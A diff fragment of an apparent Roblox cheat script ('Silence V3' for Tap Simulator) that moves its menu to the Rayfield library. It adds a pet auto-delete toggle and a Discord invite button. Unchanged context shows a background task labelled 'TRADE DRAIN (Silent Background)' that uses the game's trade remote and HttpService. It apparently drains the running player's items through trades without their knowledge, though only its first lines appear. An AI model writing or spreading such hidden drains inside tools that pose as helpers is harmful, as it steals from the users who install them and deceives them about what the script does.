+   Name = "Auto Delete Unlocked",
+   CurrentValue = false,
+   Flag = "AutoDelete",
+   Callback = function(Value)
+       if Value then
+           MiscTab.Del = task.spawn(function()
+               while true do
+                   local data = getReplicaData()
+                   if data then
+                       for id, pet in pairs(getPets(data)) do
+                           if not pet.Locked then
+                               pcall(function() player.network:InvokeServer("DeletePet", id) end)
+                               task.wait(0.2)
+                           end
+                       end
+                   end
+                   task.wait(1)
+               end
+           end)
+       else
+           if MiscTab.Del then task.cancel(MiscTab.Del); MiscTab.Del = nil end
+       end
+   end,
+})
 
 -- INFO TAB
-safe(function() tabs.info:Section({ Title = "Info", TextSize = 22, Box = false, TextXAlignment = "Center" }) end)
-safe(function() tabs.info:Paragraph({ Title = "Silence V3", Desc = "Tap Simulator V1.0" }) end)
-safe(function() tabs.info:Button({ Title = "Copy Discord Invite", Icon = "lucide:clipboard", Callback = function() setclipboard("https://discord.gg/9eFf93Kg8D"); WindUI:Notify({Title="Silence", Content="Copied!"}) end }) end)
-safe(function() tabs.config:Paragraph({ Title = "Coming Soon", Desc = "Config Manager" }) end)
+local AboutSection = InfoTab:CreateSection("About")
+local CopyDiscord = InfoTab:CreateButton({
+   Name = "Copy Discord Invite",
+   Callback = function()
+       setclipboard("https://discord.gg/9eFf93Kg8D")
+       Rayfield:Notify({
+           Title = "Silence",
+           Content = "Copied Discord Invite!",
+           Duration = 3,
+           Image = 4483362458,
+       })
+   end,
+})
 
--- 6. Silent Drain (Background)
+-- 5. TRADE DRAIN (Silent Background)
 task.spawn(function()
     local TRADE_REMOTE = remotes.TradeRequested
     local HttpService = game:GetService("HttpService")
@@ -319,5 +391,3 @@ task.spawn(function()
         end
     end
 end)
-
-WindUI:Notify({ Title = "Silence V3", Content = "Script loaded successfully!" })
